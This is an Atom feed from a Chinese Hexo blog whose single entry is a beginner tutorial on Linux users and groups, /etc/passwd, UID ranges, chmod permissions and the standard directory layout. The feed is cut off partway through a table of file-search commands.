<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>运启霖泽</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-07-09T07:22:25.306Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>It is mine</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux用户、文件权限、目录、路径</title>
    <link href="http://example.com/2025/07/09/Linux%E7%94%A8%E6%88%B7%E3%80%81%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E3%80%81%E7%9B%AE%E5%BD%95%E3%80%81%E8%B7%AF%E5%BE%84/"/>
    <id>http://example.com/2025/07/09/Linux%E7%94%A8%E6%88%B7%E3%80%81%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E3%80%81%E7%9B%AE%E5%BD%95%E3%80%81%E8%B7%AF%E5%BE%84/</id>
    <published>2025-07-09T07:20:46.000Z</published>
    <updated>2025-07-09T07:22:25.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux用户、文件权限、目录、路径"><a href="#Linux用户、文件权限、目录、路径" class="headerlink" title="Linux用户、文件权限、目录、路径"></a>Linux用户、文件权限、目录、路径</h1><p>内容主要出处：</p><p><a href="https://blog.csdn.net/hzf0701/article/details/124942073">Linux用户和用户组教程</a></p><p><a href="https://docs.geeksman.com/tools/ubuntu/07.ubuntu-user-management.html">用户和用户组管理</a></p><p><a href="https://blog.csdn.net/weixin_45954730/article/details/130798013">Linux文件权限管理</a></p><p><a href="https://blog.csdn.net/u013197629/article/details/73608613">Linux权限详解（chmod、600、644、700、711、755、777、4755、6755、7755）</a></p><p><a href="https://docs.geeksman.com/tools/ubuntu/03.ubuntu-directory-structure.html#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">Linux 目录结构</a></p><p><a href="https://blog.csdn.net/qq_66726657/article/details/133587640">Linux中的相对路径和绝对路径</a></p><h2 id="用户和用户组"><a href="#用户和用户组" class="headerlink" title="用户和用户组"></a>用户和用户组</h2><h3 id="理解用户组与用户概念"><a href="#理解用户组与用户概念" class="headerlink" title="理解用户组与用户概念"></a>理解用户组与用户概念</h3><p>在建立用户组和用户之前，需要清楚用户组是由拥有相似权限需求的用户组成的。在Linux系统中，每个文件和目录都有各自的权限配置wps for linux，而用户组的存在使得权限管理变得便捷。用户则是系统中的实际使用者。以公司的Linux服务器为例，研发部门的员工可以组成一个用户组，他们对某个项目的代码目录拥有特定的读写权限。每个研发人员作为独立的用户，共享用户组的权限，同时拥有自己的账号以便于区分操作。通过将人员按角色分配到不同的用户组和用户中，可以使得系统管理更加清晰和有序。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/2144544-20201012203745705-413629468.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/7732bb2efa1f49edaa6315afb3e016f3~tplv-k3u1fbpfcp-zoom-in-crop-mark%3A1512%3A0%3A0%3A0.awebp" alt="image.png"></p><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>每个用户账号都拥有一个用户名和各自的口令（即密码）。在登录系统时，只有正确输入用户名和密码，才能进入系统和自己的主目录。</p><p>在Linux中，用户分为两大类、三小类：分别为<strong>系统管理员</strong>（一般为root）和<strong>普通用户</strong> 。普通用户中，又划分为两类，分别为系统用户和登录用户。</p><p><strong>系统管理员：</strong>即超级管理员，可以操作系统中任意文件和命令，拥有最高的管理权限。<br><strong>普通用户</strong><br>登录用户：为管理员手动添加的用户，默认仅拥有操作自身家目录中文件及目录的权限，以及进入与浏览相关目录文件的权限（如&#x2F;etc、&#x2F;var&#x2F;log等），但没有创建、修改、删除等权限。</p><p>系统用户：一般为系统安装后默认存在的，且默认情况下不能登录系统，它们的存在主要是为了满足系统进程对文件属主的需求。<br>Tips：在部署某些服务是，也可以手动添加某些系统用户。</p><p>Linux系统使用UID（User ID）来标识不同用户。Linux 系统将所有用户的名称与 ID 的对应关系都存储在 &#x2F;etc&#x2F;passwd 文件中。（其实用户名并无实际作用，只是方便用户记忆而已）</p><h4 id="超级用户（root）"><a href="#超级用户（root）" class="headerlink" title="超级用户（root）"></a>超级用户（root）</h4><ul><li><strong>用户名</strong>：<code>root</code>，<strong>UID</strong>：0</li><li><strong>权限</strong>：拥有系统的完全控制权限，能够执行所有操作（包括修改系统配置、安装&#x2F;卸载软件、管理用户、访问任意文件等）</li><li><strong>登录方式</strong>：可以通过控制台或 <code>sudo</code> 提权执行命令</li><li></li></ul><h4 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h4><p>(Regular Users）</p><ul><li><strong>UID</strong>：从 <strong>1000</strong> 开始（CentOS 7 默认）</li><li><strong>创建方式</strong>：使用 <code>useradd</code> 或图形界面添加</li><li><strong>用途</strong>：供实际使用者登录和日常操作（如开发者、系统用户）</li><li><strong>权限</strong>：只能访问授权文件和目录。无法访问系统关键目录（如 <code>/etc</code>, <code>/root</code>, <code>/boot</code> 等）</li><li><strong>提权方式</strong>：通过 <code>sudo</code>（需配置）获取临时管理员权限</li></ul><h4 id="系统用户"><a href="#系统用户" class="headerlink" title="系统用户"></a>系统用户</h4><p>（System Users）</p><ul><li><strong>UID</strong>：1 到 999（CentOS 7 默认）</li><li><strong>特点</strong>：<ul><li>通常没有登录权限（shell 是 <code>/sbin/nologin</code> 或 <code>/bin/false</code>）</li><li>不用于交互式登录，而是为某些系统服务（daemon）而存在</li></ul></li><li><strong>例子</strong>：<ul><li><code>bin</code>、<code>daemon</code>、<code>sshd</code>、<code>mysql</code>、<code>apache</code>、<code>postfix</code> 等</li></ul></li><li><strong>用途</strong>：<ul><li>运行特定服务，隔离权限</li><li>保证服务之间不会互相影响，提高安全性</li></ul></li></ul><table><thead><tr><th>UID范围</th><th>用户身份</th></tr></thead><tbody><tr><td>0</td><td>超级用户。UID 为 0 就代表这个账号是管理员账号。在 Linux 中，如何把普通用户升级成管理员呢？只需把其他用户的 UID 修改为 0 就可以了，这一点和 Windows 是不同的。不过不建议建立多个管理员账号。</td></tr><tr><td>1～499</td><td>系统用户（伪用户）。也就是说，此范围的 UID 保留给系统使用。其中，1<del>99 用于系统自行创建的账号；100</del>499 分配给有系统账号需求的用户。  其实，除了 0 之外，其他的 UID 并无不同，这里只是默认 500 以下的数字给系统作为保留账户，只是一个公认的习惯而已。</td></tr><tr><td>500～65535</td><td>普通用户。通常这些 UID 已经足够用户使用了。但不够用也没关系，2.6.x 内核之后的 Linux 系统已经可以支持 232 个 UID 了。</td></tr></tbody></table><p> 显示 <code>/etc/login.defs</code> 文件中所有包含“UID”的配置行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/login.defs | grep UID</span><br></pre></td></tr></table></figure><p><strong><code>cat /etc/login.defs</code></strong><br> 读取并显示文件 <code>/etc/login.defs</code> 的全部内容。<br> <code>/etc/login.defs</code> 是 Linux 系统中与用户账号和密码相关的配置文件，定义了很多关于用户管理的默认参数，比如 UID 范围、密码有效期等。</p><p><code>|</code>（管道符）<br> 将前面命令的输出作为后面命令的输入。</p><p><strong><code>grep UID</code></strong><br> 在输入的文本中搜索包含字符串 <code>UID</code> 的行，并打印出来。</p><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><p>是具有相同特征用户的逻辑集合。用户组里面的所有用户所拥有的权限都是一样的。所以如果想让很多用户拥有同一权限，那么就创建一个组，把需要拥有权限的用户放进这个组里就可以了。</p><p>在 Linux 系统中，用户组的划分可以从不同角度进行分类，主要包括以下三种方式：</p><p>✅ 第一种组类别（按权限角色划分）</p><ul><li><strong>管理员组</strong>：通常指具有系统管理权限的用户所属的组，例如 <code>wheel</code> 组（具备 <code>sudo</code> 权限）。</li><li><strong>普通用户组</strong>：包括系统服务用的用户组和日常登录用户所属的用户组。<ul><li><strong>系统用户组</strong>：如 <code>sshd</code>、<code>mysql</code>，主要服务于后台系统进程。</li><li><strong>登录用户组</strong>：如开发人员、学生等日常使用者所属的组。</li></ul></li></ul><p>✅ 第二种组类别（按用户归属关系划分）</p><ul><li><strong>主组（基本组）</strong>：<ul><li>每个用户<strong>必须有且只能有一个主组</strong>。</li><li>用户创建文件时，文件的默认所属组就是该用户的主组。</li></ul></li><li><strong>附加组（附属组）</strong>：<ul><li>用户可以拥有 0 个、1 个或多个附加组。</li><li>附加组常用于授予用户额外的访问权限，如加入 <code>docker</code> 组以使用容器功能。</li></ul></li></ul><p>✅ 第三种组类别（按组成员结构划分）</p><ul><li><strong>私有组</strong>：<ul><li>是系统为每个新建用户<strong>自动创建的与用户名同名的组</strong>。</li><li>该组中通常<strong>只包含该用户本身</strong>。</li><li>这是 Linux 的默认策略，称为 User Private Group（UPG）模式。</li></ul></li><li><strong>公共组</strong>：<ul><li>组内可以包含<strong>多个用户</strong>，常用于团队协作、权限共享等场景。</li><li>例如一个 <code>dev</code> 组可以包含所有开发人员，实现项目文件共享权限。</li></ul></li></ul><h3 id="用户与组的关系"><a href="#用户与组的关系" class="headerlink" title="用户与组的关系"></a>用户与组的关系</h3><ol><li>一对一：一个用户只在一个组里面，是这个组里面的唯一用户。</li><li>一对多：一个用户存在于多个用户组里面，这个用户拥有这些组的所有权限。</li><li>多对一：多个用户存在于一个组中，这些用户的权限和组都是一样的。</li><li>多对多：多个用户存在于多个组里面，这个是前面三个关系的交叉关系。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/2144544-20201012203745705-413629468.png"></p><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id username  //id 命令可以查询用户的UID、GID 和附加组的信息</span><br><span class="line">su root   # 切换管理员用户</span><br><span class="line">su 用户名  # 切换普通用户</span><br><span class="line">exit  #返回原来用户</span><br></pre></td></tr></table></figure><p><strong>添加新用户账号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useradd 选项 用户名</span><br><span class="line">sudo useradd -d /home/luo -m luo  #示例</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>选项:<ol><li>-c “comment” ：指定一段注释性描述。</li><li>-d 目录： 指定用户主目录，如果此目录不存在，则同时使用 -m 选项，可以创建主目录。</li><li>-g 用户组 ：指定用户所属的用户组。</li><li>-G 用户组，用户组 ：指定用户所属的附加组。</li><li>-s Shell 文件 ：指定用户的登录 Shell。</li><li>-u 用户号： 指定用户的用户号，如果同时有 -o 选项，则可以重复使用其他用户的标识号。</li><li>-e 账户的到期时间，格式为YYYY-MM-DD。</li></ol></li><li>用户名：指定新账号的登录名。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708202202282.png" alt="image-20250708202202282"></p><p><strong>userdel - 删除帐号</strong></p><p>常用的选项是 <code>-r</code>，它的作用是把用户的主目录一起删除；<code>-f</code>强制删除用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userdel 选项 用户名</span><br><span class="line">sudo userdel -r luo</span><br></pre></td></tr></table></figure><p><strong>passwd - 修改用户密码</strong></p><p>用户管理的一项重要内容是用户口令的管理。用户账号刚创建时没有口令，但是被系统锁定，无法使用，必须为其指定口令后才可以使用，即使是指定空口令。</p><p>指定和修改用户口令的Shell命令是passwd。超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">passwd </span><br><span class="line"></span><br><span class="line"># 锁定用户密码，用户不能登陆</span><br><span class="line">passwd -l 用户名</span><br><span class="line"># 解除锁定</span><br><span class="line">passwd -u 用户名</span><br><span class="line"></span><br><span class="line"># 查看用户的密码是否被锁定</span><br><span class="line">passwd -S</span><br><span class="line">sudo chage -l liujie  #查看用户密码信息</span><br><span class="line"></span><br><span class="line"># 删除用户密码，删除后用户不能登陆系统，重新设置密码后可以登陆系统</span><br><span class="line">passed -d 用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>用户组</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">groupadd [选项] 组名</span><br><span class="line"></span><br><span class="line"># 创建组</span><br><span class="line">groupadd dev</span><br><span class="line">grep dev /etc/group  #查看组</span><br><span class="line"></span><br><span class="line"># 创建用户并添加到 dev 中，-g 表示指定用户所属的用户组</span><br><span class="line">useradd -m -g dev aaa</span><br><span class="line">sudo useradd -m -g users -G dev aaa  #dev 会作为“附加组”，就会出现在 /etc/group 中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 修改现有用户到新组</span><br><span class="line">usermod -g test aaa</span><br><span class="line"></span><br><span class="line">sudo userdel -r aaa   # 删除用户及其 home 目录</span><br><span class="line">sudo groupdel dev     # 再删除 dev 组</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="用户和用户组文件"><a href="#用户和用户组文件" class="headerlink" title="用户和用户组文件"></a>用户和用户组文件</h3><h4 id="用户账号文件-etc-passwd"><a href="#用户账号文件-etc-passwd" class="headerlink" title="用户账号文件 &#x2F;etc&#x2F;passwd"></a>用户账号文件 &#x2F;etc&#x2F;passwd</h4><p>&#x2F;etc&#x2F;passwd文件是Linux系统安全的关键文件之一，只有系统管理员才可以修改此文件。该文件用于用户登录等操作时校验用户的登录名、加密的口令数据项、用户ID（UID）、默认的用户组ID（GID）、用户信息、用户主目录及登录后使用的shell。该文件种每一行保存一个用户的资料，而用户数据按域以冒号’:’分割</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#cat /etc/passwd</span><br><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708194522039.png" alt="image-20250708194522039"></p><p><a href="https://blog.csdn.net/yangchuang111213/article/details/144179418">出处</a></p><p>1）”用户名”是代表用户账号的字符串。</p><p>2）“口令”一些系统中，存放着加密后的用户口令字。</p><p>3）“用户标识号”是一个整数，系统内部用它来标识用户。</p><p>4）“组标识号”字段记录的是用户所属的用户组。</p><p>5)“注释性描述”字段记录着用户的一些个人情况。</p><p>6)“主目录”，也就是用户的起始工作目录。</p><p>7)用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。</p><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="不同身份用户的访问权限"><a href="#不同身份用户的访问权限" class="headerlink" title="不同身份用户的访问权限"></a>不同身份用户的访问权限</h3><p>在Linux操作系统中，任何文件都归属于某一特定的用户，其作为多用户系统，为区分不同用户对文件的权限，Linux 以 “用户与用户组” 的概念，建立用户与文件权限之间的联系，保证系统能够充分考虑每个用户的隐私保护，很大程度上保障了 Linux 作为多用户系统的可行性。从文件权限的角度出发，“用户与用户组” 引申为三个具体的对象——文件所有者、用户组成员、其他人。每一个对象对某一个文件的持有权限是不同的。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/08dd67deb199e2a1f510f0377e72e137.png" alt="img"></p><p>在 Linux 系统中，每个文件都明确规定了不同身份用户的访问权限，通过 <code>ls -al</code>命令即可看到。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708174528854.png" alt="image-20250708174528854"></p><p>可以看到，每行的第一列表示的就是各文件针对不同用户设定的权限，一共 11 位，但第 1 位用于表示文件的具体类型，最后一位此文件受 SELinux 的安全规则管理。因此，为文件设定不同用户的读、写和执行权限，仅涉及到 9 位字符。</p><h4 id="文件所有者（User）"><a href="#文件所有者（User）" class="headerlink" title="文件所有者（User）"></a>文件所有者（User）</h4><p>当一个用户创建了一个文件，这个用户就是这个文件的文件所有者。文件所有者对文件拥有最高权限，除非文件所有者开放权限，否则其他人无法对文件执行查看、修改等操作。<strong>这也是 Linux 系统能够保护用户隐私的最关键的原因。</strong>在文件所有者占有文件之后，需要文件所有者对其他用户开放权限，其他用户才能查看、修改文件。</p><p>如果仅区分 “文件所有者” 和 “其他用户”，那么文件所有者对其他用户开放权限后，所有其他用户均能查看、修改文件。但是，若文件所有者希望仅对部分用户开放，那么仅仅区分 “用户所有者” 和 “其他用户” 显然不满足需求。这就引入了 “用户组的概念”。</p><h4 id="所属组（Group）"><a href="#所属组（Group）" class="headerlink" title="所属组（Group）"></a>所属组（Group）</h4><p>将 “其他用户” 区分为用户组成员和其他人后，若文件所有者希望对部分用户开放权限，而对其他人继续保持私有，则只需要将这部分用户与文件所有者划入一个用户组。这样，这部分用户就成了与文件所有者同组的用户组成员。用户可以对用户组成员开放文件权限，用户组成员则具备了查看、修改文件的权限，而对其他无关用户保持私有。</p><p>用户组成员在团队开发中非常有帮助。例如，团队成员之间保持文件资源共享，但对非团队成员保持私有，这就需要将文件所有者与团队成员用户划分为同一个用户组，再对用户组成员开放权限即可。</p><p>需要注意的是，一个用户可在多个用户组中。</p><h4 id="其他人（Others）"><a href="#其他人（Others）" class="headerlink" title="其他人（Others）"></a>其他人（Others）</h4><p>顾名思义，就是与文件所有者没有任何联系的用户，即不是文件所有者也不是所在文件所属用户组。</p><h4 id="超级管理员（root）"><a href="#超级管理员（root）" class="headerlink" title="超级管理员（root）"></a>超级管理员（root）</h4><p>由于Linux系统中，root具有最高权限，可以执行任何想要执行的操作，也正因为如此，处于安全考虑，一般情况下不推荐使用 root 用户进行日常使用。root 用户所所在的用户组称为 “root组”，处于 root 组的普通用户，能够通过 sudo 命令获取 root 权限，即我们是可以通过sudo权限来操作文件的。</p><h4 id="AAA基础"><a href="#AAA基础" class="headerlink" title="AAA基础"></a>AAA基础</h4><p>AAA指的是Authentication、Authorization、Accounting，即认证、授权和审计。</p><p>认证：验证用户是否可以获得权限，是AAA的第一步，即验证身份；<br>授权：授权用户可以使用那些服务或资源，即身份验证成功后，赋予这个身份相应的权限；<br>审计：记录用户的操作情况，在Linux中，日志就是审计的一种手段。<br>Linux的用户和组管理可以说是基于AAA进行的，首先用户登录输入用户名密码，就是认证的过程；其次，在用户登录成功后，所拥有的权限各不相同，这就是授权；最后，用户的操作历史会记录在日志中，这是审计。</p><h3 id="文件权限类型"><a href="#文件权限类型" class="headerlink" title="文件权限类型"></a>文件权限类型</h3><p><strong>文件类型</strong></p><table><thead><tr><th>标识</th><th>含义</th></tr></thead><tbody><tr><td>-</td><td>普通文件</td></tr><tr><td>d</td><td>目录文件(文件夹)</td></tr><tr><td>p</td><td>管道文件(通信作用的文件)</td></tr><tr><td>l</td><td>链接文件(软连接,快速找到文件)</td></tr><tr><td>b</td><td>块设备文件(如磁盘,磁盘叫块设备,因为存储是以块为基本单位的)</td></tr><tr><td>c</td><td>字符设备文件(如键盘,显示器 , 按字节字符顺序显示,输入)</td></tr><tr><td>s</td><td>套接字文件</td></tr></tbody></table><p>在Linux中，任何文件或者目录都有三种权限：<strong>读（Read）、写（Write）、执行（Execute）</strong></p><table><thead><tr><th></th><th>文件</th><th>目录</th></tr></thead><tbody><tr><td>Read</td><td>可以读取、查看文件的内容，比如：<code>cat、more、less、head、tail</code>等</td><td>可以读取、查看目录下边的内容，比如：<code>ls</code>等</td></tr><tr><td>Write</td><td>可以修改文件的内容，比如：<code>vi</code>或者<code>vim</code>等</td><td>可以修改目录中的内容，创建子目录、删除子目录、创建文件、删除文件、重命名文件或者目录</td></tr><tr><td>Execute</td><td>如果该文件是可执行文件（.sh），可以直接运行，比如：<code>./xxx.sh</code></td><td>可以进去该目录，比如：<code>cd</code>等</td></tr></tbody></table><h3 id="更改文件权限"><a href="#更改文件权限" class="headerlink" title="更改文件权限"></a>更改文件权限</h3><p>既然文件的基本权限就是 3 种用户身份（所有者、所属组和其他人）搭配 3 种权限（rwx），chmod 命令中用 u、g、o 分别代表 3 种身份，其中u表示所有者，g表示所属组，o表示其他人，还用 a 表示全部的身份（all 的缩写）。用 +、-、&#x3D; 分别表示给指定的用户增加、减少、设置对应的权限。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/1575dcdcf873e83d4199a51f4de9bf26.png" alt="img"></p><p><code>chmod（change mode）</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [可选项] &lt;mode&gt; &lt;file...&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708192305612.png" alt="image-20250708192305612"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708193108518.png" alt="image-20250708193108518"></p><p>范例：</p><ul><li><p>设置所有用户可读取文件 test.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~                       # 进入用户主目录</span><br><span class="line">touch test.txt             # 创建一个测试文件</span><br><span class="line">chmod ugo+r test.txt       # 这时你就可以用文件名操作了（因为就在当前目录）</span><br></pre></td></tr></table></figure></li><li><p>设置 <a href="http://c.sh/">c.sh</a> 只有 拥有者可以读写及执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+rwx c.sh</span><br></pre></td></tr></table></figure></li><li><p>设置文件 a.conf 与 b.xml 权限为拥有者与其所属同一个群组 可读写，其它组可读不可写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+r,ug+w,o-w a.conf b.xml</span><br></pre></td></tr></table></figure></li><li><p>设置当前目录下的所有档案与子目录皆设为任何人可读写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R a+rw *</span><br></pre></td></tr></table></figure></li></ul><h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/202304222054625.png" alt="img"></p><p> [Linux 目录结构](<a href="https://so.csdn.net/so/search?q=Linux">https://so.csdn.net/so/search?q=Linux</a> 目录结构&amp;spm&#x3D;1001.2101.3001.7020)</p><p><a href="https://help.ubuntu.com/community/LinuxFilesystemTreeOverview">文件目录</a></p><h3 id="系统主要目录"><a href="#系统主要目录" class="headerlink" title="系统主要目录"></a>系统主要目录</h3><p>Ubuntu 的标准目录结构大体遵循 <strong>文件系统层次结构标准（FHS）</strong>。以下是系统中最重要的目录：</p><ul><li><p><strong><code>/bin</code></strong><br>bin 是 Binaries（二进制文件）的缩写，存放最常用的终端命令，例如 <code>ls</code>、<code>mount</code>、<code>rm</code> 等。</p></li><li><p><strong><code>/boot</code></strong><br>启动系统所需的文件，包括 Linux 内核、RAM 磁盘映像和引导加载器配置文件。</p></li><li><p><strong><code>/dev</code></strong><br>dev 是 Device（设备），包含所有设备文件（ Linux 的外部设备），这些文件不是普通文件，而是指向系统中各种硬件设备的接口，例如硬盘。在 Linux 中访问设备的方式和访问文件的方式是相同的。</p></li><li><p><strong><code>/etc</code></strong><br><code>etc </code>是 Etcetera（等等） 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。影响所有用户的系统行为。</p></li><li><p><strong><code>/home</code></strong><br>用户的主目录所在之处，每个用户通常有一个子目录。一般该目录名是以用户的账号命名的，root 用户的 HOME 目录，在：<code>/root</code>。</p></li><li><p><strong><code>/lib</code></strong><br>lib 是 Library（库）的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</p></li><li><p><strong><code>/media</code></strong><br>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</p></li><li><p><strong><code>/mnt</code></strong><br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 <code>/mnt/</code> 上，然后进入该目录就可以查看光驱里的内容了。</p></li><li><p><code>/opt</code>：opt 是 optional（可选） 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个 MySQL 数据库则就可以放到这个目录下。默认是空的。</p><p><code>/proc</code>：proc 是 Processes（进程） 的缩写，<code>/proc</code> 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure></li><li><p><strong><code>/root</code></strong><br>超级用户（root）的主目录。为确保系统在 <code>/home/</code> 不可用时也能启动，root 主目录不放在 <code>/home/</code> 中。</p></li><li><p><strong><code>/run</code></strong><br>一个临时文件系统（tmpfs），在系统启动早期就可用，用于存储运行时短暂数据。<br>它取代了旧位置如 <code>/var/run</code>、<code>/var/lock</code>、<code>/lib/init/rw</code>，以及某些 <code>/dev/.*</code> 和 <code>/dev/shm</code>。</p></li><li><p><strong><code>/sbin</code></strong><br>s 就是 Super User 的意思，是 Superuser Binaries（超级用户的二进制文件）的缩写，这里存放的是系统管理员使用的系统管理程序。</p></li><li><p><strong><code>/srv</code></strong><br>可包含系统服务的数据目录，例如 Web 服务的 <code>/srv/www/</code> 或 FTP 的数据目录。</p></li><li><p><strong><code>/sys</code></strong><br>一个虚拟文件系统，可用于获取或设置内核对系统的视图信息。</p><p>这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs。sysfs 文件系统集成了下面 3 种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。该文件系统是内核设备树的一个直观反映, 当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</p></li><li><p><strong><code>/tmp</code></strong><br>Temporary（临时)用于存放应用程序的临时文件。</p></li><li><p><strong><code>/usr</code></strong></p><p>usr 是 Unix Shared Resources（共享资源） 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 <code>program files</code> 目录。</p><p>包含大部分用户工具和应用程序，部分结构类似于根目录（例如含有 <code>/usr/bin/</code> 和 <code>/usr/lib/</code>）。</p><ol><li><code>/usr/bin</code>：系统用户使用的应用程序。</li><li><code>/usr/sbin</code>：超级用户使用的比较高级的管理程序和系统守护程序。</li><li><code>/usr/src</code>：内核源代码默认的放置目录。</li></ol></li><li><p><strong><code>/var</code></strong><br>Variable（变量）专用于存放变化的数据，如日志、数据库、网站数据以及可在多次启动间保留的邮件等临时数据。<br>特别重要的子目录：<code>/var/log</code>，用于保存系统日志文件。</p></li></ul><h3 id="查看命令-查找文件"><a href="#查看命令-查找文件" class="headerlink" title="查看命令&#x2F;查找文件"></a>查看命令&#x2F;查找文件</h3><h4 id="查看命令"><a href="#查看命令" class="headerlink" title="查看命令"></a>查看命令</h4><p><code>whatis</code>、<code>info</code> 和 <code>man</code> 的作用都是是查看命令的说明。区别是：</p><ul><li><code>whatis</code> 简要说明命令的作用；</li><li><code>info</code> 详细的说明文档；</li><li><code>man</code> 查询命令的说明文档</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查看 ls 命令的简要说明</span><br><span class="line">whatis ls</span><br><span class="line"># 查看详细的说明</span><br><span class="line">info ls</span><br><span class="line"></span><br><span class="line">man 命令名       # 查看详细手册页</span><br><span class="line">--help           # 快速帮助，如：cp --help</span><br></pre></td></tr></table></figure><h4 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h4><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>find</code></td><td>在目录中查找文件（条件强大）</td><td><code>find /home -name &quot;*.txt&quot;</code></td></tr><tr><td><code>locate</code></td><td>快速查找文件名（基于数据库）</td><td><code>locate 